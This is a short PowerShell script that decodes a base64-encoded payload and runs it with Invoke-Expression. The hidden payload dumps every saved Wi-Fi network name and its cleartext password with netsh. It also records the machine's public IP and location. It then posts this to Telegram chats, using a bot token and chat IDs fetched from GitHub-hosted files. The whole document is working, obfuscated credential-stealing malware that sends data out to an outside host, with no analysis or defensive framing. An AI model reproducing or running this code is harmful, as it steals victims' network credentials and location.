$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KIyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ1BlcmZpbCBkZSB0b2RvcyBsb3MgdXN1YXJpb3MnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnTm9tYnJlIGRlIFNTSUQnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgICA9ICdUaXBvIGRlIHJlZCcNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGVudGljYWNpw7NuJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lmcmFkbycNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICAgID0gJ0NvbnRlbmlkbyBkZSBsYSBjbGF2ZScNCiAgICAgICAgfQ0KICAgICAgICAnZW4tRU4nID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ0FsbCBVc2VyIFByb2ZpbGUnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdQcm9maWxlIG5vdCBmb3VuZCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICAgID0gJ1NTSUQgbmFtZScNCiAgICAgICAgICAgICduZXR3b3JrX3R5cGVfdGV4dCcgICAgICAgID0gJ05ldHdvcmsgVHlwZScNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGhlbnRpY2F0aW9uJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lwaGVyJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJFByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBHZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1sndXNlcl9wcm9maWxlc190ZXh0J10NCiAgICB9DQoNCiAgICAkV0xBTl9Qcm9maWxlcyA9IEAoKQ0KDQogICAgJFByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkd2xhbl9Qcm9maWxlID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgJF8ga2V5PWNsZWFyDQoNCiAgICAgICAgaWYgKCR3bGFuX1Byb2ZpbGUgLWNvbnRhaW5zICRMQU5HWydwcm9maWxlX25vdF9mb3VuZF90ZXh0J10pIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQoNCiAgICAgICAgJEludGVyZmFjZU5hbWUgPSBHZXRWYWx1ZUJ5TmFtZSAkd2xhbl9Qcm9maWxlICRMQU5HWydzc2lkX25hbWVfdGV4dCddDQoNCiAgICAgICAgaWYgKCRJbnRlcmZhY2VOYW1lKSB7DQogICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9ICRJbnRlcmZhY2VOYW1lLlRyaW0oJyInKQ0KDQogICAgICAgICAgICAjIENvcnJlZ2lyIGNhcmFjdGVyZXMgZXNwZWNpYWxlcyBzaSBlcyBuZWNlc2FyaW8NCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6R2V0RW5jb2RpbmcoIklTTy04ODU5LTEiKS5HZXRCeXRlcygkSW50ZXJmYWNlTmFtZSkpDQoNCiAgICAgICAgICAgICRXTEFOX1Byb2ZpbGVzICs9IFtQU0N1c3RvbU9iamVjdF1Aew0KICAgICAgICAgICAgICAgIFNTSUQgICAgICAgICAgID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICBLZXkgICAgICAgICAgICA9ICIiDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRLZXkgPSBHZXRWYWx1ZUJ5TmFtZSAkd2xhbl9Qcm9maWxlICRMQU5HWydrZXlfdGV4dCddDQoNCiAgICAgICAgICAgIGlmICgkS2V5KSB7DQogICAgICAgICAgICAgICAgJFdMQU5fUHJvZmlsZXNbLTFdLktleSA9ICRLZXkNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkV0xBTl9Qcm9maWxlcy5Db3VudCAtZ3QgMCkgew0KICAgICAgICAjIE9idGVuZXIgbGEgaW5mb3JtYWNpw7NuIGRlIGxhIElQIHkgdWJpY2FjacOzbg0KICAgICAgICAkaXBJbmZvID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vaXBpbmZvLmlvL2pzb24iDQogICAgICAgICRyZXN1bHRNZXNzYWdlID0gImByYG4qKkluZm9ybWFjacOzbiBkZSBJUCB5IFViaWNhY2nDs246KipgcmBuIg0KICAgICAgICAkcmVzdWx0TWVzc2FnZSArPSAiKipJUDoqKiAkKCRpcEluZm8uaXApYHJgbiINCiAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gIioqVWJpY2FjacOzbjoqKiAkKCRpcEluZm8uY2l0eSksICQoJGlwSW5mby5yZWdpb24pLCAkKCRpcEluZm8uY291bnRyeSlgcmBuIg0KDQogICAgICAgICRXTEFOX1Byb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gImByYG4qKlNTSUQ6KiogJCgkXy5TU0lEKWByYG4qKlBhc3N3b3JkOioqICQoJF8uS2V5KWByYG4iDQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gJHJlc3VsdE1lc3NhZ2UNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gJ05vIHNlIGVuY29udHJhcm9uIHBlcmZpbGVzIFdMQU4uJw0KICAgIH0NCn0NCg0KIyBGdW5jdGlvbiB0byBzZW5kIGEgbWVzc2FnZSB0byBUZWxlZ3JhbQ0KZnVuY3Rpb24gU2VuZC1UZWxlZ3JhbU1lc3NhZ2Ugew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdG9rZW4sDQogICAgICAgIFtzdHJpbmddJGNoYXRJZCwNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCg0KICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR0b2tlbi9zZW5kTWVzc2FnZSINCg0KICAgICMgRGl2aWRpciBlbCBtZW5zYWplIGVuIHBhcnRlcyBtw6FzIHBlcXVlw7FhcyAocG9yIGVqZW1wbG8sIGNhZGEgNDA5NiBjYXJhY3RlcmVzKQ0KICAgICRtZXNzYWdlUGFydHMgPSBbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddXTo6bmV3KCkNCiAgICAkbWF4TWVzc2FnZUxlbmd0aCA9IDQwOTYNCg0KICAgIHdoaWxlICgkbWVzc2FnZS5MZW5ndGggLWd0ICRtYXhNZXNzYWdlTGVuZ3RoKSB7DQogICAgICAgICRtZXNzYWdlUGFydHMuQWRkKCRtZXNzYWdlLlN1YnN0cmluZygwLCAkbWF4TWVzc2FnZUxlbmd0aCkpDQogICAgICAgICRtZXNzYWdlID0gJG1lc3NhZ2UuU3Vic3RyaW5nKCRtYXhNZXNzYWdlTGVuZ3RoKQ0KICAgIH0NCiAgICAkbWVzc2FnZVBhcnRzLkFkZCgkbWVzc2FnZSkNCg0KICAgIGZvcmVhY2ggKCRwYXJ0IGluICRtZXNzYWdlUGFydHMpIHsNCiAgICAgICAgJHBhcmFtcyA9IEB7DQogICAgICAgICAgICBjaGF0X2lkID0gJGNoYXRJZA0KICAgICAgICAgICAgdGV4dCA9ICRwYXJ0DQogICAgICAgIH0NCg0KICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1Cb2R5ICRwYXJhbXMNCiAgICB9DQp9DQoNCiMgVGVsZWdyYW0gY29uZmlndXJhdGlvbg0KJHRva2VuQ29uZmlnID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL2NvbmZpZzIudHh0Ig0KJGNoYXRJZHMgPSBJbnZva2UtUmVzdE1ldGhvZCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlcmljZW5hL2hhcHB5YmlydGhkYXkuZ2l0aHViLmlvL21haW4vZGF0b3MvdXN1YXJpby9sdWlzaGluby50eHQiDQoNCiMgUnVuIHRoZSBHZXQtV0xBTl9Qcm9maWxlcyBmdW5jdGlvbiBhbmQgc3RvcmUgdGhlIHJlc3VsdA0KJHJlc3VsdCA9IEdldC1XTEFOX1Byb2ZpbGVzDQoNCiMgU2VuZCB0aGUgcmVzdWx0IGFzIGEgbWVzc2FnZSB0byBlYWNoIGNoYXQgSUQNCmZvcmVhY2ggKCRjaGF0SWQgaW4gJGNoYXRJZHMpIHsNCiAgICBTZW5kLVRlbGVncmFtTWVzc2FnZSAtdG9rZW4gJHRva2VuQ29uZmlnIC1jaGF0SWQgJGNoYXRJZCAtbWVzc2FnZSAkcmVzdWx0DQp9DQoNCg=='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
